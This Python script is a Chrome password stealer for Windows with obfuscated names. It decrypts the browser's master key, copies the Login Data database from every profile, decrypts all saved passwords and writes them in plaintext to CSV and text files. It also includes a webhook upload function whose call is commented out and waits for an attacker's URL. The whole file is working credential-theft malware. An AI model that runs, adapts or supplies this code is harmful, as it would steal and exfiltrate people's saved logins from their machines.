import os as o
import re as r
import sys as s
import json as j
import base64 as b
import sqlite3 as q
import win32crypt as w
from Crypto.Cipher import AES
import csv as c
import requests as req

# GLOBAL CONSTANTS
C1 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (o.environ['USERPROFILE']))
C2 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (o.environ['USERPROFILE']))

def k1():
    """Get and decrypt Chrome's master key from Local State."""
    try:
        with open(C1, "r", encoding='utf-8') as f:
            local_state = j.load(f)
        encrypted_key = b.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return w.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[ERR] Chrome secret key not found: {e}")
        return None

def k3(aes_key, iv):
    """Return an AES-GCM cipher object."""
    return AES.new(aes_key, AES.MODE_GCM, iv)

def k4(cipher_blob, aes_key):
    """Decrypt a single Chrome password blob."""
    try:
        iv = cipher_blob[3:15]
        ciphertext = cipher_blob[15:-16]
        tag = cipher_blob[-16:]
        cipher = k3(aes_key, iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[ERR] Decryption failed: {e}")
        return ""

def k5(chrome_db_path):
    """
    Create a safe copy of Chrome's Login Data using SQLite's backup API.
    Works even if Chrome is open.
    """
    try:
        src = q.connect(chrome_db_path, check_same_thread=False)
        dst = q.connect("Loginvault.db")
        src.backup(dst)
        src.close()
        return dst
    except Exception as e:
        print(f"[ERR] Could not open Chrome DB: {e}")
        return None

def k6(output, file_name='decrypted_passwords.txt'):
    """Save the decrypted output to a text file."""
    try:
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write(output)
        print(f"[INFO] Output saved to {file_name}")
    except Exception as e:
        print(f"[ERR] Unable to save file: {e}")

def k7(file_name, webhook_url):
    """POST the saved file content to a webhook URL."""
    try:
        with open(file_name, 'r', encoding='utf-8') as f:
            data = f.read()
        response = req.post(webhook_url, data={'file_content': data})
        if response.status_code == 200:
            print("[INFO] Successfully sent data to the webhook.")
        else:
            print(f"[ERR] Webhook failed. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Error sending file to webhook: {e}")

if __name__ == '__main__':
    try:
        master_key = k1()
        if not master_key:
            s.exit(1)

        profiles = [d for d in o.listdir(C2) if r.match(r"^Profile \d+$", d) or d == "Default"]
        output_data = ""
        csv_file = 'decrypted_password.csv'

        with open(csv_file, mode='w', newline='', encoding='utf-8') as df:
            writer = c.writer(df)
            writer.writerow(["index", "url", "username", "password"])

            for profile in profiles:
                db_path = o.path.join(C2, profile, "Login Data")
                conn = k5(db_path)
                if not conn:
                    continue

                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for idx, (url, user, blob) in enumerate(cursor.fetchall()):
                    # Skip empty or non-AES-GCM blobs
                    if not blob or not blob.startswith(b'v10'):
                        continue

                    password = k4(blob, master_key)
                    print(f"URL: {url}\nUsername: {user}\nPassword: {password}\n{'-'*50}")
                    output_data += f"Sequence: {idx}\nURL: {url}\nUsername: {user}\nPassword: {password}\n{'*'*50}\n"
                    writer.writerow([idx, url, user, password])

                cursor.close()
                conn.close()
                o.remove("Loginvault.db")

        k6(output_data)
        # Replace '<your_webhook_url>' with actual URL if you want to POST
        # k7('decrypted_passwords.txt', '<your_webhook_url>')

    except Exception as e:
        print(f"[ERR] {e}")
